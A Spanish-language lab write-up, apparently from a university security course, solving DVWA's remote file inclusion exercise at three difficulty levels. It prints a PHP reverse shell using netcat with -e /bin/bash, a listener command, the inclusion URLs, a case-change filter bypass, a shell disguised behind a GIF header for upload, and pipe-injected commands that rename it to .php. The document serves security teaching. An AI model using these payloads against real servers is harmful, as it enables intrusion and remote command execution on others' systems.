# RFI

Remote file inclusion (RFI) es una vulnerabilidad que permite a un atacante incluir archivos de un servidor remoto. Esto puede ser utilizado para incluir archivos PHP, que luego pueden ser utilizados para ejecutar código arbitrario en el servidor.

## Bajo

Para comenzar, podemos intentar lanzar un shell remoto escrito en PHP `php-reverse-shell.php` que se encuentra en nuestro servidor local y que previamente hemos creado con el siguiente contenido:

```php
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

A continuación, ponemos en escucha el puerto 4000 en nuestro servidor local para recibir la conexión del servidor remoto:

```bash
nc -lvnp 4000
```

Una vez puesto en escucha, podemos intentar incluir el archivo `php-reverse-shell.php` en el servidor remoto a través de la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/php-reverse-shell.php
```

Una vez incluido el archivo, el servidor remoto intentará conectarse al servidor local en el puerto 4000, y si todo ha ido bien, obtendremos una shell remota.
Una vez hayamos obtenida la shell remota, podemos intentar mejorar la TTY para poder interactuar con ella de una manera más cómoda, para ello ejecutamos el siguiente comando:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Una vez mejorada la TTY, podemos intentar leer el archivo `fi.php` utilizando cat:

```bash
cat DVWA/hackable/flags/fi.php
```

![rfi](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/rfi.png)

## Medio

Al igual que en el nivel bajo, podemos intentar incluir el archivo `php-reverse-shell.php` en el servidor remoto a través de la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/php-reverse-shell.php
```

Si probamos a ejecutarlo, comprobaremos que no funciona debido a que el servidor habra reemplazado el `http://` por una cadena vacía y por tanto no podrá conectarse al servidor local. Para poder solucionar esto, podemos probar cambiando `http` -> `Http` | `httphttp` | `HTTP` | etc.

```
http://localhost/DVWA/vulnerabilities/fi/?page=Http://localhost/php-reverse-shell.php
```

![rfi-2](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/rfi-2.png)

Como se puede ver, se ha vuelto a visualizar el archivo `fi.php` de donde extraemos todas las citas.

## Alto

Al contrario que en los niveles anteriores, ahora para subir la reverse shell al servidor remoto debemos hacerlo aprovechando otra vulnerabilidad, en este caso la vulnerabilidad de `subida de archivos` o `file upload`. Para ello, podemos utilizar el script utilizado en la sección de `file upload`:

```php
GIF98
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

Como se menciona en la otra sección se puede ver que se consigue subir el archivo `shell.png` a través de la siguiente URI:
![uploaded-high](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FU/assets/uploaded-h.png)

```
../../hackable/uploads/shell.png
```

```bash
|ls ../../hackable/uploads/
```

```bash
|mv ../../hackable/uploads/shell.png ../fi/file5.php
```

![challenge-4](https://github.com/Hec7or-Uni/seginf-pr-5/blob/main/FI/assets/challenge-4.png)

/hackable/flags